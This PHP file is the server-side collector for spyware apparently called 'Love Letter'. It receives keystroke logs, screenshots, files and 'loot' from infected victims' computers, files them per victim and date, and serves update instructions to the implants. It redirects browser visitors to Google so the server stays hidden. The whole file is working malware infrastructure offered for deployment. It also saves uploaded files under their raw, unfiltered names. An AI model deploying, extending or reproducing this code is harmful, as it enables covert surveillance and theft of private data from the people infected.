<?php
/*
    TellMe.php - handles all file uploads, get and post request
    from the Love Letter and puts them in place on your server.

    Tested on PHP 5 and can work on later versions, all you 
    have to do is copypaste this on your server's public directory.
    
    If you're getting an undefined mb_strcut error, install mbstring:
    sudo apt-get install php-mbstring
    
    >---------

    Modify Update.json to your liking.

    >---------


*/

/// Show all errors for debugging purposes.
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

function GetIP() 
{ 
	$ip = $_SERVER['REMOTE_ADDR']; 
	return($ip); 
} 

/// A function that filters bad filename characters on a string.
function FilterFilename($name) {
    // remove illegal file system characters https://en.wikipedia.org/wiki/Filename#Reserved_characters_and_words
    $name = str_replace(array_merge(
        array_map('chr', range(0, 31)),
        array('<', '>', ':', '"', '/', '\\', '|', '?', '*')
    ), '', $name);
    // maximise filename length to 255 bytes http://serverfault.com/a/9548/44086
    $ext = pathinfo($name, PATHINFO_EXTENSION);
    $name= mb_strcut(pathinfo($name, PATHINFO_FILENAME), 0, 255 - ($ext ? strlen($ext) + 1 : 0), mb_detect_encoding($name)) . ($ext ? '.' . $ext : '');
    return $name;
}

/// A function that checks if a folder exist, if not create it.
function CheckFolder($folder){
    if (!file_exists($folder)) {
        mkdir($folder, 0777, true);
    }
}
/// The unfortunate person's username on their PC.
$username = $_GET["username"];
/// The type of file to upload.
$uploadtype = $_GET["type"];
/// Today's date.
$date = date("Y-m-d");

/// If UA is empty (or loot upload)
if (empty($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] == null) {
    /// Folder to put everything.
    $pillagefolder = "loot/";
    /// A folder dedicated for storing the unfortunate person's logged data.
    $userfolder = $pillagefolder . $date . "/" . FilterFilename($username);
    /// Check if the current date's folder exist. If not create it.
    CheckFolder($userfolder);

    $delimiter = "[" . date("h:i:sa") . " by " . GetIP()  . "]" . PHP_EOL;
    /// Parse upload.
    switch($uploadtype){
        case "logs":
            /// Get sent logs.
            $logs = $_REQUEST[$uploadtype];
            $logfile = $userfolder . "/keylogs.txt";
            $fh = fopen($logfile, 'a') or die("Can't create file");
            fwrite($fh, $delimiter);
            fwrite($fh, $logs);
        break;
        case "fileevent":
            /// Get sent logs.
            $logs = $_REQUEST[$uploadtype];
            $logfile = $userfolder . "/fileevents.txt";
            $fh = fopen($logfile, 'a') or die("Can't create file");
            fwrite($fh, $delimiter);
            fwrite($fh, $logs);
        break;
        case "applicationevent":
            /// Get sent logs.
            $logs = $_REQUEST[$uploadtype];
            $logfile = $userfolder . "/applicationevents.txt";
            $fh = fopen($logfile, 'a') or die("Can't create file");
            fwrite($fh, $delimiter);
            fwrite($fh, $logs);
        break;
        case "loot":
            /// Get sent logs.
            $logs = $_REQUEST[$uploadtype];
            $logfile = $userfolder . "/loots.txt";
            $fh = fopen($logfile, 'a') or die("Can't create file");
            fwrite($fh, $delimiter);
            fwrite($fh, $logs);
        break;
        case "screenshot":
            $screenshotfolder = $userfolder . "/screenshots";
            CheckFolder($screenshotfolder);
            $screenshotfile = $screenshotfolder . "/" . date("h-i-sa") . ".jpg";
            $filefromtemp = $_FILES["file"]["tmp_name"];
            move_uploaded_file($filefromtemp, $screenshotfile);
            break;
        case "file":
            $filesfolder = $userfolder . "/files";
            CheckFolder($filesfolder);
            $fileinserver = $filesfolder . "/" . $_FILES["file"]["name"];
            $filefromtemp = $_FILES["file"]["tmp_name"];
            move_uploaded_file($filefromtemp, $fileinserver);
        break;
        case "update":
            header("Content-Type: text/plain");
            // show update.json
            readfile("Update.json");
            break;
    }
    /// force 200 OK, just in case
    header("HTTP/1.1 200 OK");
    /// End session.
    die();
}
else { // is browser, redirect somewhere else
    header('Location: http://www.google.com');
}
?>

<html>
    This is needed to make vscode's php formatter work...idk why
</html>